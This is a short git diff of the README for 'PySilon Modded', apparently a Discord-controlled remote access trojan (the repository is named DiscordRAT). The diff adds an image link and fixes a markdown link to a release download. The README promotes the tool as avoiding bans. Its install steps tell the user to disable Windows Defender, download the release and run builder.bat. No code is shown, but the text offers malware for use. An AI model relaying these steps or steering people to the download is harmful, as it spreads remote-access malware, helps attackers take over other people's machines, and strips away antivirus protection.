@@ -1,3 +1,5 @@
+[tools/drawling_studio/images (2).jpg
+](https://github.com/MaitreAuxb/DiscordRAT/blob/main/tools/drawling_studio/images%20(2).jpg)
 # PySilon Modded - No More Bans 🚀
 
 ## Description
@@ -51,7 +53,7 @@ PySilon Modded offers a wide range of advanced features:
    Make sure to **disable Windows Defender** before installing PySilon Modded.
 
 2. **Download PySilon Modded:**
-   Get the [release version][https://github.com/MaitreAuxb](https://github.com/MaitreAuxb/DiscordRAT/releases/tag/ModdedPysilonV2) or the source code.
+   Get the [release version](https://github.com/MaitreAuxb/DiscordRAT/releases/tag/ModdedPysilonV2) or download the source code.
 
 3. **Run the builder:**
    Launch the `builder.bat` batch file.  
